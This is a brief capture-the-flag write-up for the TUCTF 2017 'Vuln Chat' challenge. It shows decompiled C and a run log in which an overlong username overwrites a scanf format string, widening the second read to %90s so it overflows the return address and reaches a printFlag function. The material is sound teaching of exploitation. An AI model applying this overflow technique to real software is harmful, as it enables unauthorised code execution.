# TUCTF 2017 Vuln Chat

```Canary``` and ```PIE``` are disabled, and there is a ```printFlag``` function at ```0x804856b```.

```c
  local_9 = 0x73303325; // %30s
  local_5 = 0;
  __isoc99_scanf(&local_9,local_1d);
  printf("Welcome %s!\n",local_1d);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",local_1d);
  __isoc99_scanf(&local_9,local_31);
```

We will have to overflow into ```local_9``` and change the format string parameter to allows us to overflow ```ret```. 

```bash
[root@pwn:~/tuctf2017_vulnchat]$ python expl.py 
[+] Starting local process './vuln-chat': pid 2159
[*] Switching to interactive mode
----------- Welcome to vuln-chat -------------
Enter your username: Welcome AAAAAAAAAAAAAAAAAAAA%90s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
AAAAAAAAAAAAAAAAAAAA%90s: djinn: Sorry. That's not good enough
flag{generic-flag}
Use it wisely
```